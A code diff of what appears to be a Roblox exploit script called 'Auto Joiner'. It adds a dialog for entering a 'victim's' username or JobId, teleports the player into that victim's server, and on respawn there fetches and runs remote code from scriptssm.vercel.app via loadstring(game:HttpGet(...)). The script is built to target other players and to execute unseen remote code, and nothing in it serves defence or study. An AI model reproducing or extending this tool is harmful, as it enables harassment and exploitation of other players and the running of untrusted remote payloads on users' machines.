@@ -26,8 +26,8 @@ end
 
 local Config = _G["Script-SM_Config"]
 
--- Get JobId from ServerBrowser
-local function getVictimJobId()
+-- Get current JobId
+local function getCurrentJobId()
     local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
     local jobId = nil
     pcall(function()
@@ -36,7 +36,205 @@ local function getVictimJobId()
     return (jobId and jobId ~= "") and jobId or game.JobId
 end
 
--- Main GUI Creation
+-- Find victim player and get their JobId
+local function findVictimJobId(victimName)
+    local victim = Players:FindFirstChild(victimName)
+    if victim then
+        print("[Auto Joiner] Found victim: " .. victimName)
+        return getCurrentJobId() -- They're in our server, return current JobId
+    else
+        print("[Auto Joiner] Victim not found, will need JobId")
+        return nil
+    end
+end
+
+-- Teleport to target JobId
+local function teleportToJobId(targetJobId)
+    if not targetJobId or targetJobId == "" then
+        warn("[Auto Joiner] Invalid JobId")
+        return false
+    end
+    
+    print("[Auto Joiner] Attempting to teleport to JobId: " .. targetJobId)
+    local success = pcall(function()
+        TeleportService:TeleportToPlaceInstance(CorrectPlaceId, targetJobId, LocalPlayer)
+    end)
+    
+    return success
+end
+
+-- Create join dialog first
+local function CreateJoinDialog()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "JoinDialogGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+    
+    local panel = Instance.new("Frame")
+    panel.Size = UDim2.new(0, 400, 0, 300)
+    panel.Position = UDim2.new(0.5, -200, 0.5, -150)
+    panel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+    panel.BorderSizePixel = 0
+    panel.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = panel
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(80, 150, 255)
+    stroke.Thickness = 2
+    stroke.Parent = panel
+    
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    title.BorderSizePixel = 0
+    title.Text = "🎮 Join Victim's Server"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.TextColor3 = Color3.fromRGB(100, 200, 255)
+    title.Parent = panel
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 12)
+    titleCorner.Parent = title
+    
+    -- Info Label
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(1, -20, 0, 50)
+    infoLabel.Position = UDim2.new(0, 10, 0, 60)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "Enter victim's username or JobId:"
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.TextSize = 14
+    infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
+    infoLabel.Parent = panel
+    
+    -- Input Box
+    local inputBox = Instance.new("TextBox")
+    inputBox.Size = UDim2.new(1, -20, 0, 40)
+    inputBox.Position = UDim2.new(0, 10, 0, 120)
+    inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    inputBox.BorderSizePixel = 0
+    inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    inputBox.PlaceholderText = "Username or JobId..."
+    inputBox.Font = Enum.Font.Gotham
+    inputBox.TextSize = 12
+    inputBox.Parent = panel
+    
+    local inputCorner = Instance.new("UICorner")
+    inputCorner.CornerRadius = UDim.new(0, 6)
+    inputCorner.Parent = inputBox
+    
+    -- Join Button
+    local joinButton = Instance.new("TextButton")
+    joinButton.Size = UDim2.new(0.48, 0, 0, 45)
+    joinButton.Position = UDim2.new(0, 10, 0, 180)
+    joinButton.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
+    joinButton.BorderSizePixel = 0
+    joinButton.Text = "🚀 Join Server"
+    joinButton.Font = Enum.Font.GothamBold
+    joinButton.TextSize = 12
+    joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    joinButton.Parent = panel
+    
+    local joinCorner = Instance.new("UICorner")
+    joinCorner.CornerRadius = UDim.new(0, 6)
+    joinCorner.Parent = joinButton
+    
+    -- Cancel Button
+    local cancelButton = Instance.new("TextButton")
+    cancelButton.Size = UDim2.new(0.48, 0, 0, 45)
+    cancelButton.Position = UDim2.new(0.52, 0, 0, 180)
+    cancelButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+    cancelButton.BorderSizePixel = 0
+    cancelButton.Text = "❌ Cancel"
+    cancelButton.Font = Enum.Font.GothamBold
+    cancelButton.TextSize = 12
+    cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    cancelButton.Parent = panel
+    
+    local cancelCorner = Instance.new("UICorner")
+    cancelCorner.CornerRadius = UDim.new(0, 6)
+    cancelCorner.Parent = cancelButton
+    
+    -- Status Label
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 40)
+    statusLabel.Position = UDim2.new(0, 10, 0, 240)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Ready to join"
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 11
+    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    statusLabel.Parent = panel
+    
+    local function attemptJoin()
+        local input = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
+        
+        if input == "" then
+            statusLabel.Text = "⚠️ Enter username or JobId"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+            return
+        end
+        
+        statusLabel.Text = "🔄 Joining..."
+        statusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
+        joinButton.Enabled = false
+        
+        -- Check if it's a username or JobId
+        local jobId = nil
+        local isUsername = input:match("^[a-zA-Z0-9_-]+$") and not input:match("-")
+        
+        if isUsername then
+            -- Try to find by username
+            jobId = findVictimJobId(input)
+            if not jobId then
+                statusLabel.Text = "❌ Victim not found in server"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                joinButton.Enabled = true
+                return
+            end
+        else
+            -- Assume it's a JobId
+            jobId = input
+        end
+        
+        local success = teleportToJobId(jobId)
+        if success then
+            statusLabel.Text = "✅ Teleporting..."
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        else
+            statusLabel.Text = "❌ Teleport failed"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            joinButton.Enabled = true
+        end
+    end
+    
+    joinButton.MouseButton1Click:Connect(function()
+        attemptJoin()
+    end)
+    
+    cancelButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+    
+    -- Enter key to join
+    inputBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then
+            attemptJoin()
+        end
+    end)
+    
+    print("[Auto Joiner] Join dialog created!")
+end
+
+-- Main GUI Creation (appears after teleporting)
 local function CreateControlGUI()
     local playerGui = LocalPlayer:WaitForChild("PlayerGui")
     
@@ -357,11 +555,29 @@ print("[Auto Joiner] Current JobId: " .. game.JobId)
 -- Create GUI
 CreateControlGUI()
 
--- Auto load Script-Fixed.lua after 3 seconds
-task.wait(3)
-print("[Auto Joiner] Auto-loading Script-Fixed.lua...")
-pcall(function()
-    loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
+-- Main execution
+print("[Auto Joiner] Script started!")
+print("[Auto Joiner] Current JobId: " .. game.JobId)
+
+-- Show join dialog
+CreateJoinDialog()
+
+-- Listen for respawn to re-show the control GUI
+Players.LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(2)
+    -- Auto create control GUI when respawned on victim's server
+    if _G["ControlGUICreated"] == nil then
+        print("[Auto Joiner] Creating control panel on victim's server...")
+        _G["ControlGUICreated"] = true
+        CreateControlGUI()
+        
+        -- Auto load Script-Fixed.lua after 2 seconds
+        task.wait(2)
+        print("[Auto Joiner] Auto-loading Script-Fixed.lua...")
+        pcall(function()
+            loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
+        end)
+    end
 end)
 
-print("[Auto Joiner] Ready! Use the control panel to manage the script.")
+print("[Auto Joiner] Ready! Input victim username or JobId to join their server.")
